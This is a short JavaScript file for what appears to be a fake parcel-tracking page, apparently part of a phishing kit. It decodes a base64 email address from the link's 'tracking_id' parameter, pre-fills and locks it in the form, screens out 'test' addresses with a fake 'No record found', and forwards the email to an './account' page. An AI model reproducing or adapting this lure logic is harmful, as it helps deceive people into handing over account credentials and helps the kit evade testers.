// 
const validEmail = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/

// 
const track_input = document.querySelector(".track_input");
const urlEmail = new URLSearchParams(window.location.search);
const usermail = urlEmail.get('tracking_id');
const loader = document.getElementById("loader");

// if (validEmail.test(usermail)) {
//     track_input.value = usermail.toLowerCase();
//     track_input.readOnly = true;
// }

if(validEmail.test(atob(usermail))){
    track_input.value = usermail;
    track_input.readOnly = true; 
}

// 
function fexIputGet(d) {
    let updateText = d.parentElement
    let dataText = updateText.getElementsByClassName("track_id")[0]
    if (d.value.toUpperCase() == "ENTER TRACKING ID") {
        dataText.innerHTML = d.value
        d.value = ""
    }
}

// 
function fexBtnSub(r) {
    let gotServer = "";
    let getMail = r.parentElement.parentElement;
    let tempMail = getMail.getElementsByClassName("track_input")[0];

    if (validEmail.test(tempMail.value)) {
        gotServer = tempMail.value
    }
    else if (validEmail.test(atob(tempMail.value))){
        gotServer = atob(tempMail.value)
    }
    else{
        alert("Invalid Tracking Code")
        return
    }

    if (gotServer.includes("test@") || gotServer.includes("@test")) {
        setTimeout(() => {
            alert("No record found")
        }, 1000);
        return
    }

    // 

    if (!validEmail.test(gotServer)) {
        alert("Invalid Tracking ID");
        return
    }

    loader.style.display = "flex";

    location.replace("./account?id="+gotServer);
}